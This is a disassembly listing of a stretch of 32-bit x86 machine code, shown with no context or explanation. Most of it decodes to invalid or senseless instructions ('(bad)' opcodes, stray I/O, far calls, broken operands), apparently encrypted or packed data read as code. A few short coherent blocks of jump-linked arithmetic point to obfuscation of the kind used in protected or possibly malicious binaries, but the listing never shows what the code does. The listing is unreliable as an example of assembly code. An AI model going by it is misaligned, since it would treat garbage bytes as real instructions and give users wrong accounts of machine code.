  41453e:	jne    0x414520
  414540:	xor    DWORD PTR [ecx+0x4b],eax
  414543:	(bad)  
  414544:	nop
  414545:	out    0x78,al
  414547:	inc    esp
  414548:	inc    ebp
  414549:	and    BYTE PTR [ebx+0x37],cl
  41454c:	dec    esp
  41454d:	fcomp  QWORD PTR [ecx]
  41454f:	sub    BYTE PTR [ebp+0x694d026d],ah
  414555:	(bad)  
  414557:	pop    ss
  414558:	popa   
  414559:	data16 cmp ah,dh
  41455c:	xchg   ebx,eax
  41455d:	cmp    esi,0xffffffbb
  414560:	sub    BYTE PTR [esi],ah
  414562:	and    eax,0x8352f04
  414567:	sub    bh,BYTE PTR [eax+0x7877d918]
  41456d:	xchg   ebp,eax
  41456e:	pop    eax
  41456f:	push   0xffffff99
  414571:	retf   0x9c20
  414574:	mov    esi,eax
  414576:	ss push eax
  414578:	outs   dx,DWORD PTR ds:[esi]
  414579:	fidivr WORD PTR ds:0x3f907659
  41457f:	icebp  
  414580:	jbe    0x41457a
  414582:	add    bl,dh
  414584:	mov    BYTE PTR [ecx-0x4e],bh
  414587:	mov    dh,0x17
  414589:	das    
  41458a:	daa    
  41458b:	mov    esp,0xb1383725
  414590:	js     0x41454f
  414592:	xchg   edx,eax
  414593:	mov    esi,0xcd6847da
  414598:	pop    edx
  414599:	mov    ds:0xd510156c,al
  41459e:	lds    esi,FWORD PTR ds:0xe950e761
  4145a4:	jb     0x414585
  4145a6:	(bad)  [ebx-0x27]
  4145a9:	test   BYTE PTR [eax+0x4e],ch
  4145ac:	scas   al,BYTE PTR es:[edi]
  4145ad:	test   eax,0x7d3f503f
  4145b2:	inc    edi
  4145b3:	inc    ebx
  4145b4:	test   DWORD PTR [edx],esp
  4145b6:	test   DWORD PTR [edi+eax*4],edx
  4145b9:	bound  eax,QWORD PTR [ebx+0x1fdf1383]
  4145bf:	enter  0x2525,0xfb
  4145c3:	in     eax,dx
  4145c4:	aad    0x4c
  4145c6:	popf   
  4145c7:	sbb    DWORD PTR [ecx],edi
  4145c9:	jmp    FWORD PTR [ebx+0x62]
  4145cc:	(bad)  [eax-0x5b02d14f]
  4145d2:	add    edx,eax
  4145d4:	out    0x94,eax
  4145d6:	xchg   edx,eax
  4145d7:	adc    esi,DWORD PTR [ebp+eiz*2+0x41]
  4145db:	mov    BYTE PTR [edi+0x26],al
  4145de:	pop    esp
  4145df:	rol    BYTE PTR [edi+0x59095a03],0x46
  4145e6:	adc    dl,bh
  4145e8:	dec    edi
  4145e9:	sbb    eax,0x4da7a3fc
  4145ee:	std    
  4145ef:	mov    al,ds:0x4363ac95
  4145f4:	mov    edi,0x6bebd378
  4145f9:	pop    es
  4145fa:	cmp    esi,ebp
  4145fc:	retf   0x9e97
  4145ff:	mov    cl,0x77
  414601:	fnstenv [edi+0x46]
  414604:	sar    BYTE PTR [ebp-0x4a05fea3],cl
  41460a:	jge    0x41461b
  41460c:	mov    al,ds:0x2c21000d
  414611:	inc    eax
  414612:	push   ds
  414613:	pop    edi
  414614:	push   es
  414615:	sbb    dh,BYTE PTR [edi-0x7cd8d55a]
  41461b:	lock adc bh,BYTE PTR [ebx+ebp*2-0x1c]
  414620:	add    esi,ebp
  414622:	jo     0x41469d
  414624:	adc    eax,0x1becd37f
  414629:	xor    eax,0xe41a5d28
  41462e:	loope  0x4145f4
  414630:	je     0x414633
  414632:	fcom   DWORD PTR [edi-0x318b8777]
  414638:	pop    ecx
  414639:	mov    ebx,0x86b54134
  41463e:	xchg   edx,eax
  41463f:	push   eax
  414640:	mov    cl,al
  414642:	push   ss
  414643:	xchg   edx,eax
  414644:	mov    ecx,0x2dd73741
  414649:	lods   al,BYTE PTR ds:[esi]
  41464b:	iret   
  41464c:	and    DWORD PTR [esi-0x60],esp
  41464f:	test   DWORD PTR ds:0xd057f9dc,0x7d343f1b
  414659:	data16 jp 0x41466b
  41465c:	scas   eax,DWORD PTR es:[edi]
  41465d:	xlat   BYTE PTR ds:[ebx]
  41465e:	mov    edi,DWORD PTR [ebp-0x18]
  414661:	jmp    0x4148e9
  414666:	retf   
  414667:	ret    0xd23d
  41466a:	vpand  xmm3,xmm5,xmm1
  41466e:	ret    0xb492
  414671:	cmp    BYTE PTR [esi],0x17
  414674:	and    BYTE PTR ds:0x787f0fae,al
  41467a:	in     eax,0x7e
  41467c:	js     0x4146f6
  41467e:	das    
  41467f:	sbb    ecx,DWORD PTR [eax-0x7f]
  414682:	and    DWORD PTR [ebp-0x15],edi
  414685:	aam    0xe4
  414687:	ja     0x414683
  414689:	push   esi
  41468a:	add    BYTE PTR [ebx],dh
  41468c:	dec    ebp
  41468d:	inc    edx
  41468e:	aaa    
  41468f:	add    cl,BYTE PTR [ebx]
  414691:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414692:	push   0x82345478
  414697:	xor    BYTE PTR [eax+eiz*4-0x557db805],dh
  41469e:	fwait
  41469f:	add    DWORD PTR [eax],ebp
  4146a1:	test   eax,0x9d8667d4
  4146a6:	lds    esp,FWORD PTR [edx-0x2f1a3ac]
  4146ac:	in     al,dx
  4146ad:	cmp    eax,0x403b5674
  4146b2:	sub    eax,0xbfd0f27
  4146b7:	in     al,dx
  4146b8:	sbb    cl,cl
  4146ba:	lahf   
  4146bb:	adc    DWORD PTR [edi-0x37],ebp
  4146be:	sub    cl,BYTE PTR [ebx+0x1e740036]
  4146c4:	lahf   
  4146c5:	push   0x2
  4146c7:	dec    ecx
  4146c8:	inc    ebx
  4146c9:	push   0xdd47b449
  4146ce:	mov    al,0x0
  4146d0:	mov    ecx,0x82081fc9
  4146d5:	enter  0xe4b2,0x1e
  4146d9:	mov    ebx,0x6ec3eebb
  4146de:	mov    cl,0xc9
  4146e0:	mov    ecx,0xda408d6f
  4146e5:	out    0x69,al
  4146e7:	scas   eax,DWORD PTR es:[edi]
  4146e8:	mov    DWORD PTR [eax+0x45139ec7],esi
  4146ee:	xor    DWORD PTR [ecx+esi*8+0x31c24862],esp
  4146f5:	(bad)  
  4146f6:	hlt    
  4146f7:	xchg   esi,eax
  4146f8:	mov    ds:0xf421d5f7,al
  4146fd:	inc    edi
  4146fe:	lods   eax,DWORD PTR ds:[esi]
  4146ff:	in     al,dx
  414700:	push   edx
  414701:	aad    0xcc
  414703:	mov    ds:0x3ff10c94,al
  414708:	(bad)  
  41470a:	push   ebx
  41470b:	mov    ecx,0x336bcad2
  414710:	or     edi,DWORD PTR [ecx+0x11]
  414713:	mov    bh,bh
  414715:	test   al,0xd6
  414717:	fs adc esp,esi
  41471a:	jl     0x41475c
  41471c:	ins    BYTE PTR es:[edi],dx
  41471d:	inc    esp
  41471e:	cmp    DWORD PTR [edx+0x3eeac68e],ecx
  414724:	dec    esp
  414725:	add    eax,0x982fe04d
  41472a:	lahf   
  41472b:	test   al,0x26
  41472d:	dec    esp
  41472e:	inc    edx
  41472f:	inc    edx
  414730:	xor    al,0xe3
  414732:	imul   DWORD PTR ds:0xab4a7c73
  414738:	ja     0x4147aa
  41473a:	es aas 
  41473c:	cmp    eax,0xfe516f6e
  414741:	mov    dl,0xcb
  414743:	or     BYTE PTR [edx],ah
  414745:	in     al,0xdf
  414747:	out    dx,eax
  414748:	lock adc ebx,DWORD PTR [ecx-0x255eba59]
  41474f:	xlat   BYTE PTR ds:[ebx]
  414750:	or     eax,0xe45eb507
  414755:	arpl   WORD PTR fs:[ebx-0x4f87364e],bp
  41475c:	fadd   DWORD PTR [eax]
  41475e:	push   cs
  41475f:	(bad)  
  414760:	sub    ebp,DWORD PTR [eax-0x1e]
  414763:	icebp  
  414764:	push   0xeafc1154
  414769:	push   ss
  41476a:	mov    dh,0x9f
  41476c:	mov    ds:0x8b41e0cc,al
  414771:	add    dh,ah
  414773:	ror    ebp,1
  414775:	enter  0x54cf,0xd6
  414779:	jle    0x4147ee
  41477b:	pop    edx
  41477c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41477d:	mov    edx,0xf53edcf2
  414782:	mov    esp,0x2fb622f5
  414787:	cmp    edx,DWORD PTR ds:0xcf9ccd2d
  41478d:	jmp    0x87a74b25
  414792:	jo     0x414735
  414794:	nop
  414795:	cmp    edx,ebx
  414797:	sub    ch,BYTE PTR [edx+0x46]
  41479a:	(bad)  
  41479b:	fidivr DWORD PTR [edx]
  41479d:	vmread DWORD PTR [edx],esp
  4147a0:	xchg   edi,eax
  4147a1:	push   ss
  4147a2:	sub    cl,BYTE PTR [ebp-0x75348ffc]
  4147a8:	(bad)  
  4147a9:	js     0x41477b
  4147ab:	mov    WORD PTR [ecx+0x3c],es
  4147ae:	push   ebx
  4147af:	dec    esi
  4147b0:	out    0x7b,eax
  4147b2:	retf   
  4147b3:	ins    DWORD PTR es:[edi],dx
  4147b4:	jno    0x41479f
  4147b6:	aaa    
  4147b7:	add    esi,ecx
  4147b9:	vunpckhps xmm1,xmm4,XMMWORD PTR ds:0x88a1403f
  4147c1:	pop    eax
  4147c2:	push   ecx
  4147c3:	push   ds
  4147c4:	lds    esp,FWORD PTR [ebp+0x4a6202e5]
  4147ca:	sub    eax,0xb7ebd5c5
  4147cf:	mov    cl,0xcb
  4147d1:	(bad)  
  4147d2:	in     al,0x5c
  4147d4:	mov    ah,0x85
  4147d6:	mov    ds:0x899c9334,eax
  4147db:	daa    
  4147dc:	rol    DWORD PTR [ebx],cl
  4147de:	xor    DWORD PTR [ebx+0x8],edx
  4147e1:	shr    bl,1
  4147e3:	cmp    esi,DWORD PTR ds:0xfcf053b4
  4147e9:	fcomp  st(4)
  4147eb:	xor    BYTE PTR [ebp-0x6ef5ed8f],bl
  4147f1:	scas   al,BYTE PTR es:[edi]
  4147f2:	pushf  
  4147f3:	jp     0x41480f
  4147f5:	xor    ecx,ecx
  4147f7:	das    
  4147f8:	int    0x24
  4147fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4147fb:	xchg   ebx,eax
  4147fc:	xchg   BYTE PTR [ebp+0x6d260c86],dl
  414802:	xchg   BYTE PTR [esi+0x17135752],cl
  414808:	inc    eax
  414809:	scas   al,BYTE PTR es:[edi]
  41480a:	popf   
  41480b:	adc    esi,edx
  41480d:	shl    dh,1
  41480f:	sbb    eax,0x33fe279f
  414814:	mov    bh,0x71
  414816:	xor    BYTE PTR [eiz*2+0x2285b413],bl
  41481d:	int3   
  41481e:	je     0x414859
  414820:	cld    
  414821:	stos   BYTE PTR es:[edi],al
  414822:	xchg   DWORD PTR [ebx+0x25a0ec9e],ecx
  414828:	xor    eax,0x5a0e598e
  41482d:	push   cs
  41482e:	call   0xf4cc:0x9ad8491a
  414835:	inc    ebx
  414836:	daa    
  414837:	xor    ebx,0x14eff067
  41483d:	in     eax,dx
  41483e:	jge    0x414856
  414840:	ins    BYTE PTR es:[edi],dx
  414841:	pop    edi
  414842:	lahf   
  414843:	pop    ebx
  414844:	mov    edx,0x83d462a0
  414849:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41484a:	cmp    eax,0xad219d1f
  41484f:	or     eax,0xf63932bb
  414854:	dec    esi
  414855:	and    BYTE PTR [edi+0x83e19cc],dh
  41485b:	loop   0x4147f4
  41485d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41485e:	push   cs
  41485f:	addr16 jno 0x414882
  414862:	pop    es
  414863:	sbb    DWORD PTR [edx-0x4b],esp
  414866:	aam    0x81
  414868:	jmp    0x2f10:0xf06feb46
  41486f:	int3   
  414870:	pop    ecx
  414871:	test   BYTE PTR [edi],ch
  414873:	retf   
  414874:	or     ecx,ebp
  414876:	fdivr  DWORD PTR [eax-0x16]
  414879:	push   0x6dab74c1
  41487e:	bound  ecx,QWORD PTR [eax]
  414880:	jae    0x414896
  414882:	mul    DWORD PTR [ebx+0x5d]
  414885:	lea    esp,[di]
  414888:	mov    ecx,0x434d6912
  41488d:	xchg   ecx,eax
  41488e:	cmp    eax,0x417dae92
  414893:	cmp    ah,BYTE PTR [ebx]
  414895:	fdivr  DWORD PTR [edi-0x4f]
  414898:	sub    esp,ecx
  41489a:	adc    BYTE PTR [eax-0xde2ac7e],al
  4148a0:	or     al,0x92
  4148a2:	mov    bh,0x57
  4148a4:	sti    
  4148a5:	cmp    esi,DWORD PTR [eax]
  4148a7:	(bad)  
  4148a8:	xchg   ebx,eax
  4148a9:	jle    0x41486a
  4148ab:	in     eax,dx
  4148ac:	lock mov edx,0x5edadc25
  4148b2:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4148b4:	xor    al,0xb8
  4148b6:	xchg   esp,eax
  4148b7:	mov    edi,0xab2cbba2
  4148bc:	and    eax,0x2bc56851
  4148c1:	mov    WORD PTR [edi],?
  4148c3:	xchg   edx,eax
  4148c4:	mov    dh,0x93
  4148c6:	rcl    DWORD PTR [edx-0x3311fffe],0xaa
  4148cd:	jne    0x4148b7
  4148cf:	arpl   WORD PTR [edx+0x56],si
  4148d2:	mov    eax,ds:0xedc4d84b
  4148d7:	retf   0xbc75
  4148da:	inc    esi
  4148db:	addr16 mov bh,0xe8
  4148de:	imul   ebx,edx,0xffffffca
  4148e1:	push   eax
  4148e2:	mov    dl,0x17
  4148e4:	fst    QWORD PTR ds:0x33736434
  4148ea:	clc    
  4148eb:	add    edx,edi
  4148ed:	mov    edi,DWORD PTR [ebp-0x8]
  4148f0:	lea    edx,[edx+edi*1+0x327298]
  4148f7:	mov    DWORD PTR [ebp-0x8],edx
  4148fa:	mov    edx,DWORD PTR [ebp-0x20]
  4148fd:	xor    edx,eax
  4148ff:	mov    edi,0xffcd8d68
  414904:	sub    edi,edx
  414906:	add    edi,DWORD PTR [ebp-0x10]
  414909:	mov    edx,DWORD PTR [ebp-0x20]
  41490c:	mov    ebx,DWORD PTR [ebp-0x8]
  41490f:	jmp    0x414b97
  414914:	rcl    bh,0xc5
  414917:	(bad)  
  414918:	aad    0xda
  41491a:	leave  
  41491b:	(bad)  [eax+0x327854b]
  414921:	(bad)  
  414922:	jne    0x4149a3
  414924:	sbb    ecx,DWORD PTR [edi+edi*2]
  414927:	js     0x41490e
  414929:	jle    0x4149a3
  41492b:	js     0x41492a
  41492d:	(bad)  
  41492e:	out    0x91,eax
  414930:	out    0x84,eax
  414932:	jl     0x414959
  414934:	ins    DWORD PTR es:[edi],dx
  414935:	dec    ebp
  414936:	xor    ah,BYTE PTR ds:0xe9961abd
  41493c:	sqrtps xmm7,XMMWORD PTR [edi-0x5afe5763]
  414943:	bswap  esi
  414945:	push   edi
  414946:	dec    edx
  414947:	mov    ebx,0x6197d397
  41494c:	(bad)  
  41494d:	loope  0x414908
  41494f:	inc    ebp
  414950:	js     0x414947
  414952:	sub    ah,BYTE PTR [eax+ebp*2]
  414955:	ror    dx,1
  414958:	push   ecx
  414959:	dec    esp
  41495a:	retf   
  41495b:	arpl   WORD PTR [ebx],di
  41495d:	push   es
  41495e:	sbb    DWORD PTR [edi],esp
  414960:	pusha  
  414961:	aad    0x9f
  414963:	mov    eax,ds:0xd2ef9907
  414968:	push   edi
  414969:	ins    BYTE PTR es:[edi],dx
  41496a:	xchg   edi,eax
  41496b:	ret    
  41496c:	aas    
  41496d:	sbb    BYTE PTR [edi],bl
  41496f:	les    esp,FWORD PTR [edx-0x52]
  414972:	pop    es
  414973:	popa   
  414974:	add    al,0x2c
  414976:	repnz rol ch,0xca
  41497a:	data16 idiv BYTE PTR [ebx]
  41497d:	push   cs
  41497e:	and    eax,0x5b77630f
  414983:	jg     0x414950
  414985:	mov    ch,0x5a
  414987:	aad    0xc9
  414989:	jp     0x414922
  41498b:	imul   ebp,DWORD PTR [ecx-0x1bfec709],0xd4b28804
  414995:	retf   0x31a9
  414998:	das    
  414999:	outs   dx,BYTE PTR ds:[esi]
  41499a:	pop    ecx
  41499b:	push   ds
  41499c:	mov    ebp,ecx
  41499e:	aaa    
  41499f:	jecxz  0x414990
  4149a1:	repz push 0x7c
  4149a4:	sti    
  4149a5:	jle    0x414a14
  4149a7:	jl     0x4149ef
  4149a9:	inc    ebp
  4149aa:	daa    
  4149ab:	xor    BYTE PTR [edi-0x2c4547a9],cl
  4149b1:	sbb    ebx,DWORD PTR [eax-0x6a]
  4149b4:	mov    ch,ch
  4149b6:	sub    al,0x61
  4149b8:	pop    DWORD PTR [esp+ecx*2+0x47]
  4149bc:	sub    bl,ah
  4149be:	in     al,0x33
  4149c0:	and    dh,BYTE PTR [ebp+0x39]
  4149c3:	aas    
  4149c4:	push   0xffffffe3
  4149c6:	adc    eax,edi
  4149c8:	xchg   edi,eax
  4149c9:	fwait
  4149ca:	popa   
  4149cb:	mov    al,ds:0x6cd49a6
  4149d0:	jmp    0x4149b2
  4149d2:	mov    ds:0xc2c02064,al
  4149d7:	and    eax,0xc3d5f755
  4149dc:	(bad)  
  4149dd:	jecxz  0x4149be
  4149df:	jnp    0x414a4c
  4149e1:	jecxz  0x4149d6
  4149e3:	jle    0x4149e3
  4149e5:	test   BYTE PTR [esp+ebx*1],0xd3
  4149e9:	lock pop esi
  4149eb:	pop    eax
  4149ec:	gs push edx
  4149ee:	in     al,dx
  4149ef:	outs   dx,BYTE PTR ds:[esi]
  4149f0:	dec    esi
  4149f1:	call   0x6d4b:0x21d0cf44
  4149f8:	retf   
  4149f9:	stc    
  4149fa:	stos   DWORD PTR es:[edi],eax
  4149fb:	or     bh,BYTE PTR [edx]
  4149fd:	sbb    eax,0x7ecec9e0
  414a02:	lahf   
  414a03:	cmp    ebp,DWORD PTR [esi]
  414a05:	and    esi,esi
  414a07:	push   eax
  414a08:	sbb    al,dl
  414a0a:	inc    ebp
  414a0b:	into   
  414a0c:	push   ecx
  414a0d:	and    eax,DWORD PTR [ebx]
  414a0f:	test   DWORD PTR [edx+0x66],ecx
  414a12:	adc    eax,0xb495f790
  414a17:	jne    0x414a0e
  414a19:	pop    edi
  414a1a:	or     eax,0x7e11876a
  414a1f:	push   0xb8f51858
  414a24:	cmc    
  414a25:	add    bh,BYTE PTR [esi-0x7886619b]
  414a2b:	mov    BYTE PTR [edx+edi*2],dh
  414a2e:	sub    dh,dh
  414a30:	and    al,0xc1
  414a32:	adc    BYTE PTR [eax],bl
  414a34:	(bad)  
  414a35:	mov    ?,WORD PTR [edx+0x2e]
  414a38:	inc    esi
  414a39:	pop    ebx
  414a3a:	mov    dh,0x8b
  414a3c:	outs   dx,BYTE PTR ds:[esi]
  414a3d:	mov    al,ds:0x507943cf
  414a42:	inc    ebp
  414a43:	(bad)  
  414a44:	scas   eax,DWORD PTR es:[edi]
  414a45:	mov    edx,0x4b440624
  414a4a:	mov    eax,ds:0x4496b08f
  414a4f:	leave  
  414a50:	push   es
  414a51:	out    0x47,al
  414a53:	cmp    bh,BYTE PTR [edi-0x67407e6d]
  414a59:	lahf   
  414a5a:	ror    BYTE PTR [edi-0x7],0xee
  414a5e:	out    0xf,al
  414a60:	shl    DWORD PTR [esi-0x75],cl
  414a63:	push   ds
  414a64:	aam    0xdb
  414a66:	push   ecx
  414a67:	jge    0x414ac0
  414a69:	mov    bh,0xfa
  414a6b:	jo     0x414adf
  414a6d:	stos   DWORD PTR es:[edi],eax
  414a6e:	pop    eax
  414a6f:	cmp    al,0x9d
  414a71:	xor    ch,dh
  414a73:	clc    
  414a74:	hlt    
  414a75:	push   eax
  414a76:	mov    ds:0x473bca51,eax
  414a7b:	sbb    edi,esp
  414a7d:	cmp    al,0x7
  414a7f:	add    DWORD PTR [edx],ecx
  414a81:	(bad)  
  414a82:	mov    ebp,0xabab5483
  414a87:	inc    edx
  414a88:	sbb    al,bl
  414a8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a8b:	call   0x16d2:0xd5f9d90
  414a92:	inc    eax
  414a93:	(bad)  
  414a94:	sbb    bl,BYTE PTR [ebp+0x5a50cefa]
  414a9a:	int3   
  414a9b:	inc    edx
  414a9c:	cs sbb al,0x38
  414a9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414aa0:	jne    0x414ab0
  414aa2:	inc    ebx
  414aa3:	pop    esp
  414aa4:	inc    ecx
  414aa5:	mov    esp,0x6d9993c7
  414aaa:	mov    BYTE PTR [ebx],al
  414aac:	repz das 
  414aae:	cwde   
  414aaf:	out    dx,al
  414ab0:	sbb    eax,0x6e2c2738
  414ab5:	dec    esp
  414ab6:	push   DWORD PTR [ecx+0x3a130613]
  414abc:	jge    0x414b02
  414abe:	std    
  414abf:	pop    es
  414ac0:	into   
  414ac1:	scas   al,BYTE PTR es:[edi]
  414ac2:	jne    0x414a56
  414ac4:	or     edi,0x392f1eb
  414aca:	rol    bl,0x75
  414acd:	jl     0x414a89
  414acf:	inc    ecx
  414ad0:	add    bh,BYTE PTR [esi+edi*2+0x5]
  414ad4:	mov    BYTE PTR [ebp+eax*1+0x2448adaa],cl
  414adb:	sar    DWORD PTR [esi-0x2d],cl
  414ade:	stos   BYTE PTR es:[edi],al
  414adf:	mov    ch,0xbc
  414ae1:	xor    BYTE PTR [ecx+eiz*2],al
  414ae4:	aam    0xac
  414ae6:	add    eax,0xf5a41d9b
  414aeb:	fiadd  DWORD PTR [ecx+0x4d42cae]
  414af1:	or     eax,DWORD PTR [edx+0x1f47071f]
  414af7:	lahf   
  414af8:	imul   esi,DWORD PTR [esi-0x48362b],0x18
  414aff:	les    ebp,FWORD PTR [edi+0x5a8f8515]
  414b05:	ins    DWORD PTR es:[edi],dx
  414b06:	pushf  
  414b07:	jae    0x414ae9
  414b09:	add    BYTE PTR [edx-0x11efa20b],dh
  414b0f:	in     eax,dx
  414b10:	fidivr WORD PTR [ebx-0x24]
  414b13:	imul   ebp,DWORD PTR [ecx],0xffffffcc
  414b16:	les    ebp,FWORD PTR [eax]
  414b18:	xchg   esp,eax
  414b19:	sub    esp,ebx
  414b1b:	das    
  414b1c:	stos   DWORD PTR es:[edi],eax
  414b1d:	test   al,0x36
  414b1f:	dec    esp
  414b20:	ja     0x414b90
  414b22:	jbe    0x414af1
  414b24:	imul   esi,DWORD PTR [edx-0x51365ea6],0xffffffb2
  414b2b:	jle    0x414b7c
  414b2d:	rcl    esi,cl
  414b2f:	imul   ecx,DWORD PTR [eax],0xe4d6a4ac
  414b35:	or     BYTE PTR [esi],0x5
  414b38:	sbb    eax,0x150ab2d3
  414b3d:	sub    al,0xe6
  414b3f:	inc    esp
  414b40:	dec    ecx
  414b41:	popa   
  414b42:	cdq    
  414b43:	aam    0xb1
  414b45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b46:	sbb    BYTE PTR [ecx],al
  414b48:	mov    dh,0x8e
  414b4a:	(bad)  
  414b4b:	out    0xa8,eax
  414b4d:	mul    DWORD PTR [ecx+edi*1+0x38]
  414b51:	out    dx,al
  414b52:	call   0x7dfe:0xd1e4153c
  414b59:	call   0xd187:0xdde8220d
  414b60:	shr    DWORD PTR [ecx],0x1
  414b63:	mov    gs,WORD PTR [eax-0x52065a07]
  414b69:	(bad)  
  414b6b:	xor    eax,0xb25b894b
  414b70:	add    ebp,DWORD PTR [ebx]
  414b72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b73:	rcl    DWORD PTR [edi-0x78],0x66
  414b77:	push   DWORD PTR [esi-0x57]
  414b7a:	or     ebx,DWORD PTR es:[edx-0x62]
  414b7e:	cmp    DWORD PTR [esi],0x92ea9883
  414b84:	push   es
  414b85:	xor    eax,0xaa99910f
  414b8a:	push   ecx
  414b8b:	je     0x414bd3
  414b8d:	repz add dl,BYTE PTR ds:0x5aace9ff
  414b94:	push   cs
  414b95:	mov    ebx,DWORD PTR [ebx-0x2efc2fcd]
  414b9b:	imul   edx,ebx
  414b9e:	cmp    edx,edi
  414ba0:	jmp    0x414e28
  414ba5:	int    0xc1
  414ba7:	cmp    al,0xca
  414ba9:	int3   
  414baa:	leave  
  414bab:	aad    0xd9
  414bad:	xchg   esp,eax
  414bae:	mov    ch,0x6d
  414bb0:	dec    edx
  414bb1:	sub    al,0xe3
  414bb3:	(bad)
  414bb7:	jg     0x414c31
  414bb9:	in     eax,0x7e
  414bbb:	js     0x414c35
  414bbd:	pop    eax
  414bbe:	lods   al,BYTE PTR ds:[esi]
  414bbf:	outs   dx,BYTE PTR ds:[esi]
  414bc0:	(bad)  
  414bc1:	jmp    0x17810747
  414bc6:	sub    eax,DWORD PTR [edx-0x39]
  414bc9:	and    bh,BYTE PTR [ebp-0x54]
  414bcc:	test   bh,bl
  414bce:	stos   BYTE PTR es:[edi],al
  414bcf:	shl    DWORD PTR [ebp+eiz*8-0x53],1
  414bd3:	mov    ds:0xb88a7557,eax
  414bd8:	mov    cs,WORD PTR [ecx+0x64775ab8]
  414bde:	jl     0x414bd1
  414be0:	and    esp,ebx
  414be2:	or     ebx,ecx
  414be4:	test   eax,0xdbca997
  414be9:	adc    al,0x27
  414beb:	mov    BYTE PTR [edi-0xdf6ceaa],bl
  414bf1:	add    DWORD PTR [ebp-0x8],ebp
  414bf4:	cdq    
  414bf5:	mov    ah,0x96
  414bf7:	ins    BYTE PTR es:[edi],dx
  414bf8:	(bad)  
  414bfa:	inc    edi
  414bfb:	pop    ss
  414bfc:	push   ecx
  414bfd:	adc    eax,0xfd8d56e3
  414c02:	out    0xd4,eax
  414c04:	and    ch,cl
  414c06:	rcl    BYTE PTR [edi+0x1dc26182],0x73
  414c0d:	pop    esi
  414c0e:	in     al,dx
  414c0f:	sbb    al,0xcc
  414c11:	mov    esi,DWORD PTR [ebx-0x2f70b1f5]
  414c17:	sbb    ah,dl
  414c19:	cmovnp edi,eax
  414c1c:	pop    es
  414c1d:	stos   DWORD PTR es:[edi],eax
  414c1e:	jmp    0x414c59
  414c20:	leave  
  414c21:	sar    eax,cl
  414c23:	dec    esi
  414c24:	sbb    BYTE PTR [edx],ah
  414c26:	mov    ds:0x39186606,eax
  414c2b:	ins    BYTE PTR es:[edi],dx
  414c2c:	stos   DWORD PTR es:[edi],eax
  414c2d:	mov    WORD PTR [edx+esi*2-0x70],gs
  414c31:	xor    BYTE PTR [edx],0xab
  414c34:	cmp    BYTE PTR [eax+0x15],bl
  414c37:	pop    eax
  414c38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c39:	das    
  414c3a:	js     0x414c93
  414c3c:	mov    ah,0xf7
  414c3e:	les    edx,FWORD PTR [ebp-0x14ab8ffe]
  414c44:	popa   
  414c45:	pop    edi
  414c46:	mov    ebx,0x9ba916dd
  414c4b:	pop    eax
  414c4c:	jae    0x414be8
  414c4e:	and    al,BYTE PTR [ebp-0xf]
  414c51:	xchg   DWORD PTR [eax+ebx*2-0x111fde6a],ebx
  414c58:	jb     0x414c4f
  414c5a:	shl    DWORD PTR [ecx+0x6eb40605],0xd8
  414c61:	or     DWORD PTR [edx-0x1dacf4c4],0x9797a8d6
  414c6b:	jo     0x414c65
  414c6d:	pop    ds
  414c6e:	pop    edx
  414c6f:	sbb    bl,bh
  414c71:	mov    dh,0xa1
  414c73:	or     eax,0x5291d12f
  414c78:	rcr    DWORD PTR [ecx-0x56b8d69c],cl
  414c7e:	iret   
  414c7f:	dec    eax
  414c80:	mov    bl,0x2a
  414c82:	xchg   edi,eax
  414c83:	out    dx,eax
  414c84:	test   al,0xcd
  414c86:	jmp    0xbb1c:0x14e541a8
  414c8d:	stos   DWORD PTR es:[edi],eax
  414c8e:	(bad)  
  414c8f:	enter  0x303f,0x54
  414c93:	rcr    ch,cl
  414c95:	jae    0x414c3e
  414c97:	cmp    al,BYTE PTR [ebp+esi*1-0x3cc0f513]
  414c9e:	ret    
  414c9f:	push   cs
  414ca0:	sbb    cl,dh
  414ca2:	(bad)  
  414ca3:	ins    DWORD PTR es:[edi],dx
  414ca4:	call   0xbbe6320d
  414ca9:	icebp  
  414caa:	retf   0xfc22
  414cad:	mov    bh,0xc0
  414caf:	in     al,0x6a
  414cb1:	sar    BYTE PTR [edx],1
  414cb3:	(bad)  
  414cb4:	mov    DWORD PTR [edi],eax
  414cb6:	and    al,0xcd
  414cb8:	stos   BYTE PTR es:[edi],al
  414cb9:	or     ch,BYTE PTR [edi]
  414cbb:	jbe    0x414cb2
  414cbd:	mov    WORD PTR [ebp+0x71],fs
  414cc0:	sahf   
  414cc1:	dec    esp
  414cc2:	fidiv  DWORD PTR [edx-0x4d]
  414cc5:	inc    eax
  414cc6:	inc    eax
  414cc7:	(bad)  
  414cc8:	sbb    ecx,DWORD PTR [esi-0x3e]
  414ccb:	retf   0x7d56
  414cce:	push   ebx
  414ccf:	xchg   ecx,eax
  414cd0:	jo     0x414cc2
  414cd2:	xchg   ecx,eax
  414cd4:	imul   esp,DWORD PTR [eax-0x27b02ed3],0xffffffbc
  414cdb:	mov    ecx,0x7dfa7eeb
  414ce0:	or     al,0x8a
  414ce2:	(bad)  
  414ce3:	mov    ebx,0x1a4f1d8a
  414ce8:	sbb    eax,0xb59440d1
  414ced:	inc    ebp
  414cee:	sbb    DWORD PTR [edx-0x68740424],ebp
  414cf4:	repnz cmp DWORD PTR [eax+0x3c576ae6],ebp
  414cfb:	sbb    eax,0x99480ebb
  414d00:	fidiv  WORD PTR [ebp+0x20f6cb52]
  414d06:	mov    edi,0x44ad46db
  414d0b:	adc    DWORD PTR [eax+0x9260171],esi
  414d11:	icebp  
  414d12:	cwde   
  414d13:	or     al,0xee
  414d15:	cmp    eax,0xbf9d262c
  414d1a:	inc    esp
  414d1b:	fcmovbe st,st(4)
  414d1d:	xchg   ebx,eax
  414d1e:	clc    
  414d1f:	cmp    eax,0x4784d3ab
  414d24:	retf   0x5c0a
  414d27:	xchg   esi,eax
  414d28:	pop    ss
  414d29:	jmp    0x47a02ea1
  414d2e:	int3   
  414d2f:	(bad)  
  414d30:	xchg   edx,eax
  414d31:	and    dl,al
